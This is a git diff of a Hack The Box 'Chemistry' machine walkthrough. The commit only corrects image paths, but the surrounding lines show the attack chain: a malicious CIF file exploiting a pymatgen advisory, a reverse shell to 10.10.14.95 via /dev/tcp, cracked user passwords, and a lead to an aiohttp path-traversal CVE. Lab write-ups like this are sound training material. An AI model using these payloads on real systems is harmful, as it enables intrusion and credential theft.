@@ -85,14 +85,14 @@ and HTTP running on port 5000, which is remarkable.The python `Flask` Framework 
 
 ## HTTP - Port 5000
 I like to open up burp and proxy all web traffic through here to have a history and more details on the packets and the traffic.
-![Pasted image 20250103151220.png](/images/hackthebox/machines/certified/pasted-image-20250103151220.png)
+![Pasted image 20250103151220.png](/images/hackthebox/machines/chemistry/pasted-image-20250103151220.png)
 
 Browsing to this website gives me the following page
-![Pasted image 20250103151312.png](/images/hackthebox/machines/certified/pasted-image-20250103151312.png)
+![Pasted image 20250103151312.png](/images/hackthebox/machines/chemistry/pasted-image-20250103151312.png)
 
 So I create an account and continue.
 Now I can see the homepage: `dashboard`
-![Pasted image 20250103151354.png](/images/hackthebox/machines/certified/pasted-image-20250103151354.png)
+![Pasted image 20250103151354.png](/images/hackthebox/machines/chemistry/pasted-image-20250103151354.png)
 
 I take a look at the example file to see what we're dealing with here
 ```sql
@@ -115,12 +115,12 @@ loop_
 ```
 
 I will also upload this file to see how we can interact with it ourselves:
-![Pasted image 20250103151838.png](/images/hackthebox/machines/certified/pasted-image-20250103151838.png)
+![Pasted image 20250103151838.png](/images/hackthebox/machines/chemistry/pasted-image-20250103151838.png)
 
 So the file gets parsed by the website. neat! now I just have to find a way to abuse this functionality.
 
 A quick google search lands me on the following potential vulnerability:
-![Pasted image 20241230155912.png](/images/hackthebox/machines/certified/pasted-image-20241230155912.png)
+![Pasted image 20241230155912.png](/images/hackthebox/machines/chemistry/pasted-image-20241230155912.png)
 
 https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
 
@@ -143,7 +143,7 @@ _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
 ```
 
-![Pasted image 20250103152358.png](/images/hackthebox/machines/certified/pasted-image-20250103152358.png)
+![Pasted image 20250103152358.png](/images/hackthebox/machines/chemistry/pasted-image-20250103152358.png)
 
 this worked.
 Now it's time to weaponize the exploit by implementing a real payload, a reverse shell!
@@ -170,7 +170,7 @@ the payload here is: `/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.95/9002 0>&1\'`
 which will create a reverse shell to our machine. 
 > I had to include the escaping characters '\' for the single quotes in my payload otherwise it wouldn't work
 
-![Pasted image 20250103152721.png](/images/hackthebox/machines/certified/pasted-image-20250103152721.png)
+![Pasted image 20250103152721.png](/images/hackthebox/machines/chemistry/pasted-image-20250103152721.png)
 
 BOOM reverse shell landed as `app`!
 
@@ -180,7 +180,7 @@ First I'll upgrade the shell using `python pty` and then I will look around for 
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![Pasted image 20250103152844.png](/images/hackthebox/machines/certified/pasted-image-20250103152844.png)
+![Pasted image 20250103152844.png](/images/hackthebox/machines/chemistry/pasted-image-20250103152844.png)
 
 way better :D
 
@@ -242,7 +242,7 @@ c3601ad2286a4293868ec2a4bc606ba3
 ```
 
 using crackstation we already found 2
-![Pasted image 20250103153454.png](/images/hackthebox/machines/certified/pasted-image-20250103153454.png)
+![Pasted image 20250103153454.png](/images/hackthebox/machines/chemistry/pasted-image-20250103153454.png)
 
 `rosa` / `unicorniosrosados`
 `victoria` / `victoria123`
@@ -296,10 +296,10 @@ ssh -L 8081:localhost:8080 rosa@chemistry.htb
 > I used port 8081 for my local machine as I have burp running on port 8080 locally and I want to keep using burp to inspect the HTTP packets
 
 Browsing to `http://localhost:8081` on my local machine now gives me the following page
-![Pasted image 20241230161238.png](/images/hackthebox/machines/certified/pasted-image-20241230161238.png)
+![Pasted image 20241230161238.png](/images/hackthebox/machines/chemistry/pasted-image-20241230161238.png)
 
 I clicked around and then took a look into the history page of burp and saw the following
-![Pasted image 20241230161325.png](/images/hackthebox/machines/certified/pasted-image-20241230161325.png)
+![Pasted image 20241230161325.png](/images/hackthebox/machines/chemistry/pasted-image-20241230161325.png)
 
 A quick google search reveals a vulnerability:
 https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0
